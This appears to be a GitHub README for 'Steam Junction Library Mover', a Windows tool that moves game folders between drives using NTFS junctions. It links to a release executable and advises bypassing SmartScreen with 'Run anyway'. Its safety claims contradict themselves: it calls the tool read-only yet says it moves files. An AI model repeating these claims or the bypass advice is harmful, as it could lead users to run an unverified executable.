<p align="center">
  <img src="https://i.postimg.cc/sgXmfD0S/banner.png" alt="Steam Junction Library Mover — Move PC Games Between Drives Without Redownloading" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-NTFS%20Junction%20Mover-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-junction--mover--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Steam Junction Library Mover — Move PC Games Between Drives Without Redownloading

**System drive C: completely full from 150 GB modern games? Launcher refusing to move an installed game to your secondary NVMe SSD? Relocate any game folder to another NTFS drive seamlessly using native Windows Directory Junctions.**

Steam Junction Library Mover focuses on reclaiming space on your primary Windows SSD without breaking launcher paths: **moving the game directory to a secondary NTFS drive (`D:` or `E:`) and creating a transparent NTFS Directory Junction (`mklink /J`) at the original path** so Steam, Epic Games, Riot Client, and Battle.net continue updating the game normally.

This project is aimed at **Windows 10/11 PC gamers** managing multi-drive SSD storage across Steam, Epic Games, GOG, and standalone launchers—not moving protected OS `WindowsApps` system folders.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Drive `C:` out of space, blocking Windows & shader updates | Large games installed into default `C:\Program Files` paths | Move game folder to `D:`/`E:` and link back with an NTFS Junction |
| Epic Games or standalone launcher has no 'Move' button | Non-Steam launchers require manual reinstalls to change drives | Relocate the folder transparently without losing install registration |
| Fear of broken shortcuts or lost local config paths | Manual folder moves break launcher manifest paths | NTFS Directory Junctions preserve the exact original path for Windows |
| Accidental move while game or launcher is still writing | File locks causing partial copies if Steam/Epic is active | Verify process exit and byte-for-byte file count before linking |

## Download for Windows

[**Download SteamLibraryMover.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/SteamLibraryMover.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `SteamLibraryMover.exe`? (Automatic checks in ~2 seconds)

- Scans Steam (`libraryfolders.vdf`), Epic Games, and custom game folders to show exact disk sizes.
- Verifies both source and target drives are NTFS and confirms sufficient free space on destination.
- Copies files with full verification before creating a native Windows NTFS Directory Junction.
- Includes a 1-click 'Unlink & Restore' option to move any linked game back to its original drive.

### Sample Diagnostic Output

```text
[SteamLibraryMover] Auditing drives & NTFS Junction candidates...
[INFO] Drive C: (NTFS)  : 14.2 GB free / 500 GB
[OK]   Drive D: (NTFS)  : 612.8 GB free / 1000 GB
[INFO] Detected Game    : C:\Program Files\Epic Games\AlanWake2 (96.4 GB)
[OK]   Junction Ready   : Can relocate to D:\MovedGames\AlanWake2 (+96.4 GB freed on C:)
```

The release ZIP is named `SteamLibraryMover.zip`; the Windows executable inside is named `SteamLibraryMover.exe`.

1. Close Steam & PC Game Libraries before moving or checking files.
2. Click **Download SteamLibraryMover.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `SteamLibraryMover.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Steam & PC Game Libraries and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit) with NTFS-formatted source and destination drives.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `SteamLibraryMover.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Non-Steam launchers lacking built-in drive migration

While Steam supports moving libraries, Epic Games Store, Riot Client, and standalone launchers often force a full 100+ GB redownload just to change drives.

### `C:` drive filling up and choking DirectX 12 shader caches

When `C:` drops below 10 GB free, Unreal Engine 5 games suffer severe shader compilation stutter even if installed on `D:`.

### Manual `mklink /J` commands failing on typos or spaces

Command-line junction mistakes can create nested folders or broken links if paths are not quoted properly.

### Need clean verification before removing original files

A safe mover verifies file counts and sizes on the destination SSD before replacing the source folder with a junction.

## Where Steam & PC Game Libraries files normally belong

An NTFS Directory Junction transparently redirects filesystem calls from your full `C:` drive to your secondary SSD:

```text
C:\Program Files (x86)\Steam\steamapps\common\<GameFolder>
```

Inside that structure, key files and subdirectories typically look like this:

```text
C:\Program Files\Games\<GameFolder>   [NTFS Directory Junction]
        │
        └──► D:\GamesLibrary\<GameFolder>   [Actual Game Files on Secondary SSD]
```

Both source and destination drives must be formatted as **NTFS** (exFAT external drives do not support Windows Directory Junctions).

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Exit Steam, Epic Games, and the target game completely.** Ensure no launcher or background updater holds file locks.
2. **Verify the destination drive is formatted as NTFS.** Check drive properties in File Explorer (`File system: NTFS`).
3. **Confirm destination free space exceeds game folder size by 10%.** Leaves headroom for future patches.
4. **Move and verify files before creating the junction.** Confirm file count and total bytes match between source and destination.
5. **Launch the game from your launcher to verify.** Steam/Epic will see the game at its original path with zero redownload.

### Before moving any files

Never relocate `%WINDIR%` or protected `WindowsApps` system directories; stick strictly to standard game installation folders.

## What an effective diagnostic report should tell you

A clear storage check shows **NTFS status and free space on every drive**, detects existing junctions (`ReparsePoint`), and calculates exact GB freed on `C:`.

## FAQ

**Does using an NTFS Directory Junction hurt game loading speed?**

No. Junctions are resolved at the Windows filesystem driver level with zero measurable latency.

**Will Steam or Epic Games still update a junction-linked game?**

Yes. Launchers see the exact original directory path and apply patches normally.

**Can I move a game onto an exFAT external hard drive?**

No. Windows NTFS Directory Junctions require an NTFS-formatted destination volume.

**How do I undo a junction and move the game back?**

Close the launcher, remove the junction link, and copy the folder back to its original location.

## Useful reading

- [Microsoft Docs — Hard Links and Junctions (NTFS)](https://learn.microsoft.com/en-us/windows/win32/fileio/hard-links-and-junctions)

## More Windows Game Diagnostic Tools

- [DX12-ShaderCacheCleaner](../DX12-ShaderCacheCleaner) — GPU Shader Cache & DirectX 12 cleaner for NVIDIA & AMD
- [Win11-GamingDebloatGuard](../Win11-GamingDebloatGuard) — Windows 11 gaming optimizer & background process cleaner
- [WinTimer-LatencyDoctor](../WinTimer-LatencyDoctor) — Windows gaming latency, Ultimate Performance & timer check
- [NetPing-DNSGameSwitcher](../NetPing-DNSGameSwitcher) — Game server ping tester, Winsock reset & DNS switcher

*Independent open-source Windows utility. Not affiliated with Valve, Epic Games, or Microsoft.*
 
 
 
